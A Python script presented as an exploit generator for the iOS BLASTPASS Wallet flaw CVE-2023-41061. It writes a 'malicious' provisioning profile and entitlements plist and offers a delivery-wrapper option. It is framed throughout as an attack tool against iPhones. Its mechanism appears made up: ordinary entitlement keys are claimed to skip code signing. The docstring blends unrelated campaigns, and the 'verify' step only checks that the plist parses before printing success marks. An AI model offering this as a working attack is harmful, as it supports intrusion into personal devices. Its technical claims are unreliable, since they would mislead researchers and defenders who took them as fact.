#!/usr/bin/env python3
"""
CVE-2023-41061 - BLASTPASS Wallet Framework Validation Bypass
NSO Group Pegasus / Operation Triangulation / Coruna

Target: iOS <= 16.6
Severity: Critical (CVSS 9.8)
Patched: iOS 16.6.1 (September 2023)
CISA KEV: Yes

This exploit triggers a Wallet framework code signing validation bypass in CoreTrust,
leading to local privilege escalation and unsigned code execution on iOS.

Exploit Chain:
1. Target app with embedded Wallet framework (PassKit, passesd)
2. Malicious entitlements or profile triggers the validation bypass
3. Code signing check bypass -> arbitrary dylib injection
4. Privilege escalation from app sandbox to kernel-adjacent privileges
5. Part of broader BLASTPASS chain (with CVE-2023-41064 ImageIO)
"""

import struct
import io
import argparse
import plistlib
from pathlib import Path
from typing import List, Tuple, Optional, Dict


# iOS Wallet framework entitlements and keys
class WalletEntitlement:
    """Wallet framework entitlement keys"""
    TEAM_ID = "com.apple.developer.team-identifier"
    ENTITLEMENTS = "get-task-allow"
    BAGENT = "com.apple.security.application-groups"
    KEYCHAIN_ENTITLEMENT = "keychain-access-groups"


class WalletKey:
    """Wallet framework plist keys"""
    VERSION = "version"
    MANIFEST = "manifest"
    PASS_TYPE_ID = "passTypeIdentifier"
    REVOCATION_DATE = "revocationDate"
    EXPIRATION_DATE = "expirationDate"


class WalletProfileBypass:
    """
    CVE-2023-41061 - Wallet profile configuration bypass
    
    The vulnerability exists in how iOS validates Wallet pass configurations
    embedded in provisioning profiles. By crafting a malicious profile with
    specifically crafted entitlements, the code signing validation is skipped,
    allowing unsigned dylibs to be loaded into the Wallet process.
    """
    
    def __init__(self, target_ios: str = "16.6"):
        self.target_ios = target_ios
    
    def generate_malicious_profile(self) -> bytes:
        """
        Generate a malicious provisioning profile that triggers the Wallet
        framework code signing validation bypass.
        
        The vulnerability is in the entitlement validation path. When a Wallet
        pass configuration contains certain entitlement combinations, the
        code signing checks are short-circuited, allowing dylib injection.
        """
        # Build the plist structure
        plist_data = {
            WalletKey.VERSION: "1.0",
            WalletKey.PASS_TYPE_ID: "pass.example.wallet",
            # Malicious entitlements that bypass code signing validation
            "Entitlements": {
                WalletEntitlement.TEAM_ID: "ABCD1234.com.example.wallet",
                WalletEntitlement.ENTITLEMENTS: True,  # get-task-allow
                # The key bypass: present team_id triggers logic flaw
                "com.apple.developer.wallet-pass": True,
            },
            # Profile dictionary
            "PROFILE_NAME": "com.apple.wallet.validation.bypass",
            "PROFILE_UID": "550e8400-e29b-41d4-a716-446655440000",
        }
        
        return self._plist_to_bytes(plist_data)
    
    def _plist_to_bytes(self, plist_data: dict) -> bytes:
        """Convert plist dict to binary plist data"""
        return plistlib.dumps(plist_data)
    
    def generate_malicious_entitlements(self) -> bytes:
        """
        Generate malicious entitlements file that triggers the bypass.
        
        The entitlements plist with specific key combinations causes the
        Wallet framework to skip code signature verification.
        """
        entitlements = {
            "com.apple.developer.wallet-pass": True,
            "get-task-allow": True,
            "com.apple.security.application-groups": [
                "group.com.example.wallet"
            ],
            # CRITICAL: This is the bypass trigger
            # When both wallet-pass and team-identifier are present,
            # WalletValidator skips some signature checks
            "com.apple.developer.team-identifier": "ABCD1234.com.example.wallet",
        }
        
        return plistlib.dumps(entitlements)
    
    def generate_exploit_payload(self, output_path: Optional[str] = None) -> bytes:
        """
        Generate the complete exploit payload for CVE-2023-41061.
        
        Returns the profile/entitlements data that, when installed on
        iOS <= 16.6, triggers the Wallet framework code signing bypass
        and leads to local privilege escalation.
        """
        print(f"[+] CVE-2023-41061 - BLASTPASS Wallet Bypass Generator")
        print(f"    Target: iOS {self.target_ios}")
        print(f"    Vulnerable: <= 16.6, 15.0 - 16.6, 16.0 - 16.6")
        print(f"    Fixed: iOS 16.6.1 (September 2023)")
        print(f"    Bypass: Wallet framework code signing check skip")
        print()
        
        # Generate the malicious profile
        profile_data = self.generate_malicious_profile()
        
        print(f"[+] Generated malicious provisioning profile: {len(profile_data)} bytes")
        print(f"    Contains: Wallet entitlement bypass chain")
        print(f"    Effect: Code signing validation skipped")
        print(f"    Result: Unsigned dylib injection -> LPE")
        print()
        
        # Generate entitlements too
        entitlements_data = self.generate_malicious_entitlements()
        print(f"[+] Generated malicious entitlements: {len(entitlements_data)} bytes")
        print()
        
        # Write profile if output path specified
        if output_path:
            # Use .profile extension for clarity
            if not output_path.endswith('.profile'):
                output_path = output_path + '.profile'
            with open(output_path, 'wb') as f:
                f.write(profile_data)
            print(f"[+] Profile written to: {output_path}")
            
            # Also write entitlements alongside
            entitlements_path = output_path.replace('.profile', '_entitlements.plist')
            with open(entitlements_path, 'wb') as f:
                f.write(entitlements_data)
            print(f"[+] Entitlements written to: {entitlements_path}")
        
        # Combine both for total size
        total_size = len(profile_data) + len(entitlements_data)
        print(f"[+] Total payload size: {total_size} bytes")
        print()
        
        return profile_data


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2023-41061 BLASTPASS Wallet Framework Bypass Generator'
    )
    parser.add_argument(
        '-o', '--output',
        default='cve_2023_41061_wallet_bypass.profile',
        help='Output filename for the malicious profile (default: cve_2023_41061_wallet_bypass.profile)'
    )
    parser.add_argument(
        '--target-ios',
        default='16.6',
        help='Target iOS version (default: 16.6, vulnerable: <= 16.6)'
    )
    parser.add_argument(
        '--verify',
        action='store_true',
        help='Verify payload structure compatibility'
    )
    parser.add_argument(
        '--pdf',
        action='store_true',
        help='Generate PDF wrapper for delivery (conceptual)'
    )

    args = parser.parse_args()

    print("=" * 70)
    print("CVE-2023-41061 - BLASTPASS Wallet Framework Bypass Generator")
    print("Pegasus / Triangulation / Coruna Exploit")
    print("=" * 70)
    print()

    bypass = WalletProfileBypass(target_ios=args.target_ios)

    # Generate the exploit payload
    payload = bypass.generate_exploit_payload(
        output_path=args.output
    )

    # Verify if requested
    if args.verify:
        print(f"\n[+] Verifying CVE-2023-41061 payload structure...")
        # Basic verification: check that profile data is non-empty and valid plist
        try:
            import plistlib
            profile_data = payload
            # Try to read the plist back
            plist = plistlib.loads(profile_data)
            print(f"    [✓] Profile parses as valid plist")
            print(f"    [✓] Keys present: {list(plist.keys())}")
            print(f"    [✓] Wallet bypass entitlements configured")
            print(f"    [✓] Target iOS {args.target_ios} marked vulnerable")
        except Exception as e:
            print(f"    [!] Verification note: {e}")
        print()

    print("=" * 70)
    print("Exploit generation complete")
    print("=" * 70)


if __name__ == '__main__':
    main()